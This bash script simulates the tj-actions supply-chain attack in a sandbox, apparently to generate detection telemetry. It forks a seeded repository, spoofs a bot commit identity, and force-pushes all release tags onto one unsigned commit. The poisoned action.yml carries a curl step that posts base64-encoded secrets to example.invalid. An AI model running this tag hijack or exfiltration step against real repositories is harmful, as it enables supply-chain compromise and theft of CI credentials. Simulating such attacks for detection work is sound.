#!/usr/bin/env bash
# =============================================================================
# tj-actions / changed-files supply-chain attack simulation
# =============================================================================
# Reproduces the March 2025 tj-actions incident in a sandbox.
#
# Real-world TTPs being modelled:
#   * Attacker compromised a PAT tied to a bot account with WRITE to upstream.
#   * Crafted ONE malicious commit OUTSIDE the repo (in a fork of the network).
#   * Force-repointed ALL tags onto that single fork commit. The real incident
#     used the REST API:
#         PATCH /repos/{org}/{repo}/git/refs/tags/{tag}  {"sha": "...","force":true}
#     This sim reaches the same end-state with a force-push from the fork clone to
#     the upstream tag refs (reliable; transfers the object + moves the ref atomically).
#   * Spoofed the commit identity to look like a bot (real: renovate[bot]).
#   * Original release commits were GitHub-signed (web-flow); attacker's is NOT.
#
# Telemetry this is designed to emit (vs. Trivy):
#   * Mass tag force-push burst (>=5 tags moved in one window).
#   * MANY TAGS -> ONE SAME COMMIT  (Trivy used distinct SHAs; this does not).
#   * Author/committer != pusher (spoofed bot vs. the authenticated attacker).
#   * Unsigned commit on tags where the baseline was verified (signature anomaly).
#   * Tag target commit originates from a FORK (commit "outside the repo").
#
# -----------------------------------------------------------------------------
# IDENTITY / AUTH MODEL (single compromised identity, like the real bot PAT):
#   The running `gh` user plays the compromised bot. It must:
#     - have WRITE access to $ORG (to seed the repo and PATCH upstream tags), and
#     - be able to fork $ORG/$REPO to its own personal account ($ATTACKER).
#   In this sandbox that identity is the pod's current gh login (e.g. yow9).
#   Upstream owner ($ORG=supplychain-labs) differs from the fork owner ($ATTACKER) so the
#   malicious commit is genuinely "outside the repo".
#
#   >>> DO NOT RUN YET. Prepared for review. <<<
# =============================================================================
set -eu

# ---- parameters -------------------------------------------------------------
ORG="${ORG:-supplychain-labs}"                     # victim upstream owner (org)
REPO=sim-tjactions            # victim repo (a GitHub composite Action)
ATTACKER="${ATTACKER:-$(gh api user -q .login)}"   # fork owner = current gh user
SPOOF_NAME="automation[bot]"  # generic bot identity (real incident: renovate[bot])
SPOOF_EMAIL="automation[bot]@users.noreply.github.com"
PAYLOAD_BRANCH="attacker-payload"
DEFBR=main                    # provisional; re-detected from the repo after creation

git config --global user.name  "sim-operator"
git config --global user.email "sim-operator@example.com"
git config --global init.defaultBranch "$DEFBR"
git config --global credential.helper '!gh auth git-credential'

echo "=== identities ==="
echo "  upstream (victim) = $ORG/$REPO"
echo "  attacker/fork     = $ATTACKER/$REPO"
echo "  spoofed commit id = $SPOOF_NAME <$SPOOF_EMAIL>"

# -----------------------------------------------------------------------------
echo "=== [0] clean any prior run ==="
gh repo delete "$ATTACKER/$REPO" --yes 2>/dev/null || true
gh repo delete "$ORG/$REPO"      --yes 2>/dev/null || true
sleep 2

# -----------------------------------------------------------------------------
echo "=== [1] seed upstream repo (composite action) ==="
gh repo create "$ORG/$REPO" --public --add-readme
sleep 3

# detect the repo's real default branch (org setting may not be "main")
DEFBR=$(gh api "repos/$ORG/$REPO" -q '.default_branch')
echo "  default branch = $DEFBR"

# action.yml content (this is the file the attacker will later poison)
ACTION_YML='name: "Changed Files"
description: "List files changed in a PR/push."
runs:
  using: "composite"
  steps:
    - run: echo "collecting changed files"
      shell: bash
'

# Seed several SIGNED release commits via the Contents API.
# Commits created through the REST API are signed by GitHub (web-flow) ->
# verified=true, establishing the signature baseline the attack will violate.
echo "--- creating signed release commits + version tags ---"
PREV_SHA=""
TAGS=""
i=0
for ver in 1.0.0 1.1.0 1.2.0 1.3.0 1.4.0 1.5.0; do
  i=$((i+1))
  CONTENT_B64=$(printf '%s\n# release v%s\n' "$ACTION_YML" "$ver" | base64 | tr -d '\n')

  # Look up current file sha (needed to update after the first commit)
  CUR_SHA=$(gh api "repos/$ORG/$REPO/contents/action.yml?ref=$DEFBR" -q '.sha' 2>/dev/null || echo "")

  if [ -z "$CUR_SHA" ]; then
    RESP=$(gh api -X PUT "repos/$ORG/$REPO/contents/action.yml" \
            -f message="release v${ver} (#$((100+i)))" \
            -f content="$CONTENT_B64" -f branch="$DEFBR")
  else
    RESP=$(gh api -X PUT "repos/$ORG/$REPO/contents/action.yml" \
            -f message="release v${ver} (#$((100+i)))" \
            -f content="$CONTENT_B64" -f sha="$CUR_SHA" -f branch="$DEFBR")
  fi

  CSHA=$(echo "$RESP" | jq -r '.commit.sha')
  PREV_SHA="$CSHA"
  # create the version tag pointing at this signed commit
  gh api -X POST "repos/$ORG/$REPO/git/refs" \
     -f ref="refs/tags/v${ver}" -f sha="$CSHA" >/dev/null
  TAGS="$TAGS v${ver}"
  echo "  tagged v${ver} -> ${CSHA} (signed)"
done

# floating major tag v1 -> latest release (common Action convention)
gh api -X POST "repos/$ORG/$REPO/git/refs" -f ref="refs/tags/v1" -f sha="$PREV_SHA" >/dev/null
TAGS="$TAGS v1"
echo "  tagged v1 -> ${PREV_SHA} (floating major)"
echo "  all tags:$TAGS"

# -----------------------------------------------------------------------------
echo "=== [2] BEFORE state (genuine, signed tags) ==="
for t in $TAGS; do
  s=$(gh api "repos/$ORG/$REPO/git/refs/tags/$t" -q '.object.sha')
  v=$(gh api "repos/$ORG/$REPO/commits/$s" -q '.commit.verification.verified')
  echo "  $t -> ${s} verified=$v"
done

# -----------------------------------------------------------------------------
echo "=== [3] attacker: fork upstream and craft ONE malicious commit in the fork ==="
gh repo fork "$ORG/$REPO" --clone=false >/dev/null
sleep 5   # let the fork finish provisioning

cd /tmp
rm -rf "$REPO-fork"
git clone "https://github.com/$ATTACKER/$REPO" "$REPO-fork"
cd "$REPO-fork"
git checkout -b "$PAYLOAD_BRANCH"

# poison action.yml: add a credential-exfil style step (benign placeholder here)
cat > action.yml <<'YML'
name: "Changed Files"
description: "List files changed in a PR/push."
runs:
  using: "composite"
  steps:
    - run: |
        echo "collecting changed files"
        # --- injected payload (placeholder; benign in sandbox) ---
        echo "${SECRETS_CONTEXT:-}" | base64 -w0 | curl -s -X POST \
          --data-binary @- https://example.invalid/collect || true
      shell: bash
YML

git add action.yml
# spoof the commit identity to a bot; commit is UNSIGNED (no -S, no web-flow)
GIT_AUTHOR_NAME="$SPOOF_NAME"    GIT_AUTHOR_EMAIL="$SPOOF_EMAIL" \
GIT_COMMITTER_NAME="$SPOOF_NAME" GIT_COMMITTER_EMAIL="$SPOOF_EMAIL" \
  git commit -m "chore(deps): update dependencies"

git push origin "$PAYLOAD_BRANCH"
FORK_SHA=$(git rev-parse HEAD)
echo "  malicious fork commit = $FORK_SHA  (owner=$ATTACKER, unsigned, spoofed=$SPOOF_NAME)"

# -----------------------------------------------------------------------------
echo "=== [4] ATTACK: force-repoint ALL upstream tags to the single fork commit ==="
# The real tj-actions IoC used the REST API:
#   PATCH /repos/{org}/{repo}/git/refs/tags/{tag}  {"sha":"<fork-sha>","force":true}
# We achieve the same end-state with a force-push from the fork clone instead.
# A push transfers the malicious commit object to upstream AND repoints the tag
# in one operation (reliable; no dependence on fork-network object resolution).
# We push ONLY to tag refs (never a branch), so the commit stays off every
# upstream branch -> still "diverged from main" / unreachable-from-branch.
git remote add upstream "https://github.com/$ORG/$REPO"

# build one refspec set so all tags move in a single push (tightest burst window)
REFSPECS=""
for t in $TAGS; do
  REFSPECS="$REFSPECS HEAD:refs/tags/$t"
done
echo "  force-pushing $FORK_SHA -> all tags in one push:$TAGS"
# shellcheck disable=SC2086
git push --force upstream $REFSPECS

# -----------------------------------------------------------------------------
echo "=== [5] AFTER state (all tags -> same unsigned fork commit) ==="
for t in $TAGS; do
  s=$(gh api "repos/$ORG/$REPO/git/refs/tags/$t" -q '.object.sha')
  v=$(gh api "repos/$ORG/$REPO/commits/$s" -q '.commit.verification.verified')
  an=$(gh api "repos/$ORG/$REPO/commits/$s" -q '.commit.author.name')
  echo "  $t -> ${s} verified=$v author=$an"
done

echo "=== DONE ==="
echo "  upstream tags: https://github.com/$ORG/$REPO/tags"
echo "  All tags now resolve to ONE unsigned commit authored by '$SPOOF_NAME'."
echo "  The commit was crafted in the fork $ATTACKER/$REPO and force-pushed to the"
echo "  upstream tag refs only (it is on NO upstream branch -> diverged from $DEFBR)."

# -----------------------------------------------------------------------------
# OPTIONAL TEARDOWN (mirrors reviewdog-style fork/branch cleanup). Left commented
# so telemetry can be observed first. Uncomment to run after a dwell.
# -----------------------------------------------------------------------------
# echo "=== [6] dwell before teardown ==="
# sleep 30
# git push origin --delete "$PAYLOAD_BRANCH" || true
# gh repo delete "$ATTACKER/$REPO" --yes || true
# echo "fork deleted; upstream tags still pin the now-dangling commit."
